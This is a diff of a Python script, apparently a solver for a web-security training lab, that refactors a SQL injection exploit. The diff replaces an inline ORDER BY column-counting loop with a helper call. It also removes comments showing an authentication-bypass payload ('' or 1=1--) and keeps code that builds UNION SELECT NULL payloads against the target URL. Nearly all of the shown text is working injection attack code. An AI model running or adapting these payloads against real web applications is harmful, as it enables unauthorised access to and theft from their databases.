@@ -8,35 +8,16 @@
 import requests
 from proxies import proxies
 import json
-# SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese' 
-# SELECT * FROM users WHERE username = '' or 1=1-- AND password = ''
+from sqli_utils import sqli_count_columns
 
 def solve(url: str, payload: str):
     r = requests.session()
+    col_count = sqli_count_columns(r, url)
 
-    # Determine the amount of columns using order-by clauses:
-    errored = False
-    current_order_by_index = 0
-    while not errored:
-
-        if current_order_by_index >= 50:
-            print("[!] Error with script")
-            return False
-
-        uri = url + "'+order+by+{}--".format(current_order_by_index + 1)
-        res = r.get(uri, verify=False, proxies=proxies)
-        print("[~] Status Code: " + str(res.status_code) + ". Url: " + uri)
-        if res.status_code == 500:
-            errored = True
-        else:
-            current_order_by_index = current_order_by_index + 1
-        
-    print("[+] Column count: " + str(current_order_by_index))
-    
     payload = "'+union+select+"
     column_adder = "NULL"
     print("[~] Testing SQLi UNION clause")
-    for i in range(0, current_order_by_index):
+    for i in range(0, col_count):
         if i > 0:
             payload += ',+'
         payload += column_adder
